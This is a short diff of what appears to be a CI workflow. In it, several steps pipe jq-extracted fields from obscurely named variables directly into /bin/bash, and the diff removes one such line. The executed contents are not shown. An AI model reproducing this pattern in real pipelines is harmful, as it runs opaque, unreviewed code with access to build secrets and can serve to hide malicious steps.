@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$q06" | jq -r .zgsw0 | /bin/bash
           echo $jak04130 | jq -r .z87 | /bin/bash
           echo $kgbcg5058 | jq -r .o21107 | /bin/bash
-          echo $z130 | jq -r .na59513 | /bin/bash
           echo $rd111 | jq -r .vq8 | /bin/bash
 
       - name: Store results
